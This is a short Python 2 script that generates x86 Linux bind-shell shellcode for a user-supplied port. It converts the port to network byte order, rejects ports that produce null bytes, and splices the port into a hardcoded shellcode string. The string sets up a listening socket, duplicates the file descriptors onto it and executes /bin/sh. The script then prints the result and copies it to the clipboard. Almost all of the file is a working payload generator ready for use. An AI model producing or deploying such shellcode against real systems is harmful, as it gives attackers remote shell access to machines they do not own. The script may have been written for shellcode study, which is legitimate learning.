#!/usr/bin/python  

import sys  
import socket
import pyperclip

# usage

if len(sys.argv) != 2:
	print '[!] Please enter a port number [!]'	
	print '[*] Usage: {0} <port>'.format(sys.argv[0])
	exit()

port = int(sys.argv[1])

# port validation

if port > 65535:
	print '[!] Enter valid port number [!]'
	exit()

# turn that poop into wine!

net_order = socket.htons(port)

hport = hex(net_order)

byte_1 = hport[2:4]
byte_2 = hport[4:6]

if byte_1 == "00":
	print '[!] Port contains null [!]'
	exit()

if byte_2 == "00":
	print '[!] Port contains null [!]'
	exit()

new_port = '\\x' + byte_2 + '\\x' + byte_1

print '[*] Input Port: ' + str(port)
print '[*] Network Order: ' + str(net_order)
print '[*] Hex Port: ' 	+ str(hport)
print '[*] New Hex Port: ' + str(new_port)


shellcode = "\\x31\\xc0\\x31\\xdb\\xb0\\x66\\x31\\xf6\\xb3\\x01\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\x43\\x52\\x66\\x68" + new_port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x53\\x56\\x89\\xe1\\x43\\x43\\x6a\\x66\\x58\\xcd\\x80\\x52\\x52\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

length = len(shellcode)

print '[*] Shellcode length: ' + str(length)

print '[*] New Shellcode: \n' + shellcode

print '[*] Copying Shellcode to clipboard ...'

pyperclip.copy(shellcode)

print '[*] Done!'
